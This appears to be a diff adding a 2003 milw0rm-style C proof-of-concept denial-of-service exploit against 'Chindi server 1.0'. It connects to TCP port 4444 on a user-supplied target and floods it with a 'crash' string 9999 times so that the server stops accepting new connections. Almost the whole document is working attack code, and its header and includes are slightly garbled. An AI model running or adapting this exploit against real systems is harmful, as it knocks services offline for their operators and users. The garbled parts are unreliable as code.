@@ -1,0 +1,74 @@
+/***************************************************
+* Chindi server 1.0  Denial of Service
+* Proof of Concept by Luca Ercoli  luca.ercoli at inwind.it
+* After DoS, server appears to be up, but will not allow
+* new connections.                                           
+****************************************************
+
+#include 
+#include 
+#include 
+#include 
+#include 
+
+#define PORT    4444
+#define DOS     "crash"
+
+
+int main(int argc, char *argv[]){
+
+int nOpt,count,sockfd;
+struct hostent *he;
+struct sockaddr_in server_addr;
+
+char *host;
+
+printf ("\nChindi server 1.0 remote DoS\n\n");
+
+if(argc < 2 ) {
+                printf ("Usage: %s -t target\n",argv[0]);
+                exit(0);
+        }
+
+while((nOpt = getopt(argc, argv, "t")) != -1) {
+
+        switch(nOpt) {
+                        case 't':
+                        host = optarg;
+                        break;
+                        default:exit(0);
+                }
+        }
+
+if ((he = gethostbyname(argv[2])) == NULL)
+          {
+                  herror("gethostbyname");
+                  exit(1);
+          }
+
+server_addr.sin_family = AF_INET;
+server_addr.sin_port = htons(PORT);
+server_addr.sin_addr = *((struct in_addr *) he->h_addr);
+
+sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+
+if (connect (sockfd, (struct sockaddr *) &server_addr,sizeof(struct 
+sockaddr)) == -1)
+          {
+                  perror("Connect");
+                  exit(1);
+          }
+
+printf("1. Connected\n");
+sleep(1);
+printf("2. Sending crash string\n");
+sleep(1);
+printf("3. Verifing server status: ");
+sleep(1);
+
+for (count=0; count<9999; count++) send(sockfd,DOS,strlen(DOS),0);
+
+close(sockfd);
+
+
+// milw0rm.com [2003-04-18]
